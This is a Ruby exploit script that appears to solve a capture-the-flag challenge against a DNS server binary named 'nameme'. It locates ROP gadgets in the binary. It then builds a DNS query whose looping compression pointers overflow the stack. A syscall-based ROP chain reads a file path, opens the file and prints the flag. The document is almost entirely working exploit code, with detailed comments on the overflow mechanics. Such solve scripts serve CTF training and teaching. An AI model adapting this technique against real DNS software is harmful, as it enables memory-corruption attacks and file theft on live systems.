# encoding: ASCII-8bit

require 'socket'
require 'timeout'
require_relative './libronsolve'

FLAG_FILE = '/home/ctf/flag.txt'

BINARY = File.join(__dir__, '..', 'challenge', 'src', 'nameme')
EMPTY_MEMORY = 0x4A7400

begin
  POP_RDX_RET = get_rop_sequence(BINARY, "\x5a\xc3")
  puts 'A pop rdx gadget turned up!!'
  exit
rescue StandardError => e
  # do nothing
end

puts "Searching for gadgets in #{ BINARY }..."

POP_RDI_RET = get_rop_sequence(BINARY, "\x5f\xc3")
puts '-> pop rdi / ret @ 0x%08x' % POP_RDI_RET

POP_RSI_RET = get_rop_sequence(BINARY, "\x5e\xc3")
puts '-> pop rsi / ret @ 0x%08x' % POP_RSI_RET

POP_RAX_RET = get_rop_sequence(BINARY, "\x58\xc3")
puts '-> pop rax / ret @ 0x%08x' % POP_RAX_RET

POP_RDX_POP_RBX_RET = get_rop_sequence(BINARY, "\x5a\x5b\xc3")
puts '-> pop rdx / pop rbx / ret @ 0x%08x' % POP_RDX_POP_RBX_RET

SYSCALL_RET = get_rop_sequence(BINARY, "\x0f\x05\xc3")
puts '-> syscall / ret @ 0x%08x' % SYSCALL_RET

# pop rbx / pop rbp / pop r12 / pop r13 / pop r14 / pop r15
POP_POP_POP_POP_POP_POP_RET = get_rop_sequence(BINARY, "\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3")
puts '-> pop(*6) / ret @ 0x%08x' % POP_POP_POP_POP_POP_POP_RET

# pop rbp / pop r12 / pop r13 / pop r14 / pop r15
POP_POP_POP_POP_POP_RET = get_rop_sequence(BINARY, "\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3")
puts '-> pop(*5) / ret @ 0x%08x' % POP_POP_POP_POP_POP_RET

# pop r12 / pop r13 / pop r14 / pop r15
POP_POP_POP_POP_RET = get_rop_sequence(BINARY, "\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3")
puts '-> pop(*4) / ret @ 0x%08x' % POP_POP_POP_POP_RET

# pop r13 / pop r14 / pop r15
POP_POP_POP_RET = get_rop_sequence(BINARY, "\x41\x5d\x41\x5e\x41\x5f\xc3")
puts '-> pop(*3) / ret @ 0x%08x' % POP_POP_POP_RET

DEBUG = get_rop_sequence(BINARY, "\xcc")
puts '-> int 3 (debug) @ 0x%08x' % DEBUG
puts

host, port = get_host_port()
s = UDPSocket.new
s.connect(host, port)

def encode_domain(domain, ending: "\0")
  return "#{ domain.split(/\./).map { |d| [d.length, d].pack('ca*') }.join }#{ ending }"
end

def encode_question(question, type = 1, cls = 1, encode: false)
  if encode
    question = encode_domain(question)
  end

  return [
    question,
    type,
    cls,
  ].pack('a*nn')
end

# We build a ROP chain in bits and pieces, because we can only fit 13-14 64-bit
# entries into each question

data1 = [
  # ---- sys_read (to get the filename)
  POP_RDI_RET, 0,                            # fd = stdin
  POP_RSI_RET, EMPTY_MEMORY,                 # buffer
  POP_RDX_POP_RBX_RET,       64, 0x13371337, # count / unused (for rbx)
  POP_RAX_RET, 0,                            # 0 = sys_read
  SYSCALL_RET,                               # sys_read()

  # ---- sys_open
  POP_RDI_RET, EMPTY_MEMORY,                 # pathname


  # ...this gets us to data2...
  POP_POP_POP_RET, 0x3131313131313131,
]

data2 = [
  POP_RSI_RET, 0,                            # 0 = flags (O_RDONLY)
  POP_RAX_RET, 2,                            # 2 = sys_open
  SYSCALL_RET,                               # sys_open()

  # ---- sys_read
  POP_RDI_RET, 6,                            # fd = 6 (what it happens to be)
  POP_RSI_RET, EMPTY_MEMORY,                 # buffer = random memory
  POP_RDX_POP_RBX_RET, 64, 0x13371337,       # count / unused (for rbx)


  # ...this gets us to data3...
  POP_POP_POP_RET, 0x3232323232323232,
]

data3 = [
  POP_RAX_RET, 0,                            # 0 - sys_read
  SYSCALL_RET,                               # sys_read()

  # ---- sys_write
  POP_RDI_RET, 1,                            # fd = 1 = stdout
  POP_RSI_RET, EMPTY_MEMORY,                 # rsi = buffer
  POP_RDX_POP_RBX_RET, 64, 0x13371337,       # count + unused (for rbx)
  POP_RAX_RET, 1,                            # 1 = sys_write
  SYSCALL_RET,                               # sys_write()

  # Note: we don't do a clean exit here, which is kinda messy but it's a CTF so
  # whatever!
]

# Ensure we have the correct data lengths (the buffer length is VERY fussy!)
if data1.length != 14
  puts "data1 should be 14, it's #{ data1.length }!"
  exit
end

if data2.length != 14
  puts "data2 should be 14, it's #{ data2.length }!"
  exit
end

if data3.length != 13
  puts "data3 should be 13, it's #{ data3.length }!"
  exit
end

# Encode the questions
#
# The \x78 is the real length of the question/segment - it correctly jumps to
# the \x00 at the end
#
# The \xc0\x0d is a "compression pointer" that pointers to the second byte of
# the first question (\x7D), which points to the same byte in the next question,
# and so on to the bottom
#
# The \x36AAAAAA... sequence is to slightly adjust the length to optimize how
# much ROP data we get
#
# The \xc0\x0e is another compression pointer; this one goes to the second \x7D
# in the first question, which jumps to the \x7d in the remaining questions
# until it hits the \x00 end ends. Starting around the end of the first question
# (on the third time through), it overflows the stack. The third time visiting
# the third question is where the return address lands (hence data1). From
# there, it's just some standard ROP code (except that we have to deal with
# limited lengths)
questions = [
  encode_question("\x78\x7D\x7Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxabcdefgh\x00"),
  encode_question("\x78\x7D\x7D#{ data1.pack('Q*') }OOOOOO\x00"),
  encode_question("\x78\x7D\x7Dab#{ data2.pack('Q*') }CCCC\x00"),
  encode_question("\x78\x7D\x7Daaaa#{ data3.pack('Q*') }xxxxxxxxxx\x00"),
  encode_question("\x78\x7D\x00EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\x00"),
  encode_question("\x78\x7DFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\x00"),
  encode_question("\x78\x7EGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\x00"),
  encode_question("\xc0\x0d\x36AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x0e")
]

# questions = [
#   encode_question("wah-wah.dev", encode: true),
#   encode_question("www.test.com", encode: true),
#   encode_question("prog-metal.io", encode: true),
# ]

# Send a basic query
s.send([
  0x1234,
  0x0120,
  questions.length,
  0x0000,
  0x0000,
  0x0000,
].pack('nnnnnn') + questions.join, 0)

# Give a tick to process the request (this just has to not get merged witht he
# previous send)
sleep(0.01)
s.send(flag_path(), 0)

# The flag should be delivered!
check_flag(s.recv(1500), terminate: true)
